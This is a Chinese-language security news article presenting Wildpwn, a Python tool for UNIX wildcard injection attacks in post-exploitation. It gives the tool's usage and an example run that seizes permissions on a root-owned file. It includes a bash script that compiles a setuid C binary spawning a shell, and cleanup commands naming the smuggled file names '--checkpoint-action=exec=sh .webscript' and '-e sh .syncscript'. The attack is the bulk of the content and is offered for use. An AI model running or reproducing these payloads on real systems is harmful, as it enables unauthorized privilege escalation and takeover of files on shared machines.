****

![Wildpwn：Unix通配符攻击工具](https://image.3001.net/images/20180922/1537569982_5ba574beab2ee.png!small)

**[Wildpwn](https://github.com/localh0t/wildpwn/)是一个Python编写的UNIX通配符攻击工具。UNIX通配符攻击是一种较早之前的黑客技术，但时至今日仍有其用武之地。在一些后渗透场景中，我们可以利用通配符来劫持文件所有者，执行任意命令，提升权限等。**

在介绍工具之前，建议大家先阅读下这篇介绍UNIX通配符的文档：<https://www.exploit-db.com/papers/33930/>

## 基本使用

    
    
    usage: wildpwn.py [-h] [--file FILE] payload folder
    
    Tool to generate unix wildcard attacks
    
    positional arguments:
      payload      要使用的payload: (combined | tar | rsync)
      folder       要写入payloads的位置
    
    optional arguments:
      -h, --help   显示帮助信息并退出
      --file FILE  获取所有/更改权限的文件路径。该参数只支持combined攻击

##  **Payload 类型**

>  **combined:** 使用chown & chmod 文件相关技巧，具体请参阅文档的4.1 和 4.2部分。
>
>  **tar:** 使用Tar任意命令执行技巧，具体请参阅文档的4.3部分。
>
>  **rsync:** 使用Rsync任意命令执行技巧，具体请参阅文档的4.4部分。

 **使用示例：**

    
    
    $ ls -lh /tmp/very_secret_file
    -rw-r--r-- 1 root root 2048 jun 28 21:37 /tmp/very_secret_file
    
    $ ls -lh ./pwn_me/
    drwxrwxrwx 2 root root 4,0K jun 28 21:38 .
    [...]
    -rw-rw-r-- 1 root root    1024 jun 28 21:38 secret_file_1
    -rw-rw-r-- 1 root root    1024 jun 28 21:38 secret_file_2
    [...]
    
    $ python wildpwn.py --file /tmp/very_secret_file combined ./pwn_me/
    [!] Selected payload: combined
    [+] Done! Now wait for something like: chown uid:gid *  (or)  chmod [perms] * on ./pwn_me/. Good luck!
    
    [...time passes / some cron gets executed...]
    
    # chmod 000 * (for example)
    
    [...back with the unprivileged user...]
    
    $ ls -lha ./pwn_me/
    [...]
    -rwxrwxrwx 1 root root    1024 jun 28 21:38 secret_file_1
    -rwxrwxrwx 1 root root    1024 jun 28 21:38 secret_file_2
    [...]
    
    $ ls -lha /tmp/very_secret_file
    -rwxrwxrwx 1 root root 2048 jun 28 21:38 /tmp/very_secret_file

 **用于tar/rsync攻击的Bash脚本**

    
    
    #!/bin/sh
    
    # get current user uid / gid
    CURR_UID="$(id -u)"
    CURR_GID="$(id -g)"
    
    # save file
    cat > .cachefile.c << EOF
    #include <stdio.h>
    int main()
    {
    setuid($CURR_UID);
    setgid($CURR_GID);
    execl("/bin/bash", "-bash", NULL);
    return 0;
    }
    EOF
    
    # make folder where the payload will be saved
    mkdir .cache
    chmod 755 .cache
    
    # compile & give SUID
    gcc -w .cachefile.c -o .cache/.cachefile
    chmod 4755 .cache/.cachefile

 **Clean up (tar)**

    
    
    # clean up
    rm -rf ./'--checkpoint=1'
    rm -rf ./'--checkpoint-action=exec=sh .webscript'
    rm -rf .webscript
    rm -rf .cachefile.c

 **Clean up (rsync)**

    
    
    # clean up
    rm -rf ./'-e sh .syncscript'
    rm -rf .syncscript
    rm -rf .cachefile.c

***参考来源：[kitploit](https://www.kitploit.com/2018/09/wildpwn-unix-wildcard-attack-tool.html)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**

